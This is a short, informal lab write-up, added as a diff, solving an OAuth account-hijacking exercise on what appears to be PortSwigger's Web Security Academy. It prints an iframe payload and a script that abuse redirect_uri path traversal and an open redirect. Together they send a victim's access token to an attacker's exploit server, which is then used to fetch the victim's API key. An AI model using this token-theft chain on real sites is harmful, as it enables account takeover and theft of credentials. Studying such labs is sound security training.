@@ -1,0 +1,43 @@
+analysis:
+    try to add external domain => fail
+    => this means we can use redirect_uri like lab3
+    so try new solution
+    => try add folder directory traversal => they accept => can exploit to this
+
+
+
+notice that : when you get auth-callback
+they dont send back code or access token
+
+after that they call get /me and rec userinfo
+
+notice if we see in my-account: the api-ket was hidden
+=> get through /me
+
+solution:
+
+
+we try a way to add redirect_uri to our domain expoit site
+    we try to find open redirect
+    after try exploit on comment, we find that can attack through "next post" func => modify path to our exploit site
+
+our payload:
+
+<iframe src="https://oauth-0a4000da048670b8c06e52e902570012.oauth-server.net/auth?client_id=v2l6r5muiwih5olu9d8f7&redirect_uri=https://0a0c009d046070f7c0635510008300b5.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a27006304897093c0ee536601740048.exploit-server.net/exploit&response_type=token&nonce=1268738546&scope=openid%20profile%20email"></iframe>
+
+
+
+first time: they go to exploit server but can have anything in access log
+so we see that the access token in save in url location hash
+so we try request exploit server second time with document.location.hash.substr() to get access token be seen on access log after ? parametor
+<script>
+    if (!document.location.hash) {
+        window.location = 'https://oauth-0a4000da048670b8c06e52e902570012.oauth-server.net/auth?client_id=v2l6r5muiwih5olu9d8f7&redirect_uri=https://0a0c009d046070f7c0635510008300b5.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a27006304897093c0ee536601740048.exploit-server.net/exploit&response_type=token&nonce=1268738546&scope=openid%20profile%20email'
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+</script>
+
+
+ater that we go to get /me and change access token on Authorization header.
+and take api key => success
